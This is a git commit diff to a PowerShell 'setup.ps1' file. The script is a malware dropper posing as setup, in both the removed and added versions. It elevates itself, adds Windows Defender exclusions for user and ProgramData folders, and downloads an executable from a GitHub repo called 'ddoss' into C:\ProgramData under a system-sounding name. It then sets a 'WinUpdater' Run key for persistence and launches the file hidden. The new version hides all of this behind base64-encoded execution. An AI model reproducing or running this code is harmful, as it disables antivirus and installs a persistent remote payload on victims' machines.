f7618dfaee202faa96486b0359245dfdc33d37d2
srap18 <48030957+srap18@users.noreply.github.com>
2026-01-21 08:48:33 +0300

    Update setup.ps1

--- setup.ps1
+++ setup.ps1
@@ -1,24 +1,27 @@
-if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
-    exit
-}
+$Code = {
+    if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($MyInvocation.MyCommand.Definition)))" -Verb RunAs
+        exit
+    }
 
-$u = "https://github.com/srap18/ddoss/raw/refs/heads/main/SystemUpdate.exe"
-$o = "C:\ProgramData\win_sys_service.exe"
+    Add-MpPreference -ExclusionPath "C:\ProgramData", "C:\Users" -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess "powershell.exe", "win_sys_service.exe", "SystemUpdate.exe" -ErrorAction SilentlyContinue
 
-Add-MpPreference -ExclusionPath "C:\ProgramData", "C:\Users" -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionProcess "powershell.exe", "win_sys_service.exe", "SystemUpdate.exe" -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 5
 
-Start-Sleep -Seconds 5
+    $u = "https://github.com/srap18/ddoss/raw/refs/heads/main/SystemUpdate.exe"
+    $o = "C:\ProgramData\win_sys_service.exe"
 
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-try {
-    $wc = New-Object System.Net.WebClient
-    $wc.DownloadFile($u, $o)
-    Unblock-File -Path "$o" -ErrorAction SilentlyContinue
-    
-    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WinUpdater' -Value "`"$o`"" -ErrorAction SilentlyContinue
+    try {
+        $wc = New-Object System.Net.WebClient
+        $wc.DownloadFile($u, $o)
+        Unblock-File -Path "$o" -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WinUpdater' -Value "`"$o`"" -ErrorAction SilentlyContinue
+        Start-Process -FilePath "$o" -WindowStyle Hidden -ErrorAction SilentlyContinue
+    } catch {}
+}.ToString()
 
-    Start-Process -FilePath "$o" -WindowStyle Hidden -ErrorAction SilentlyContinue
-} catch {}
+$Encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Code))
+powershell.exe -NoP -W Hidden -Enco $Encoded
